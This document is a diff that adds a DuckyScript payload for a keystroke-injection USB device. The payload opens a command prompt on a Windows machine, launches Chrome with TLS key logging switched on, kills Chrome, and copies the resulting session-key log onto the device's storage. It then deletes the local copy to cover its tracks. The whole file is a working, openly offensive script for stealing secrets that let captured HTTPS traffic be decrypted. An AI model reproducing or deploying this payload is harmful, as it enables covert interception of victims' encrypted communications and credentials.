@@ -1,0 +1,37 @@
+REM SSL TLS exporter 1.0
+REM Hayden Sapp
+REM 2024-02-20
+
+REM Set attackmode
+ATTACKMODE HID STORAGE
+DELAY 2000
+
+REM Open terminal 
+GUI r
+DELAY 500
+BACKSPACE
+STRING cmd
+ENTER
+DELAY 1000
+REM Set the SSL Local Variable
+STRINGLN set SSLKEYLOGFILE=%USERPROFILE%/Desktop/sslkeylog.log
+DELAY 500
+REM Export Chrome SSL/TLS Keys
+STRINGLN "C:\Program Files\Google\Chrome\Application\chrome.exe" --ssl-key-log-file=%USERPROFILE%\Desktop\keylog.txt
+DELAY 1000
+ALT TAB
+DELAY 1000
+REM Stop chrome
+STRINGLN taskkill /im chrome.exe /t /f
+
+DELAY 2000
+REM Next move to ducky
+STRINGLN copy %USERPROFILE%\Desktop\keylog.txt E:
+DELAY 500
+REM Delete the file
+STRINGLN del %USERPROFILE%\Desktop\keylog.txt
+DELAY 1000
+ALT F4
+REM Turn off storage
+ATTACKMODE HID
+
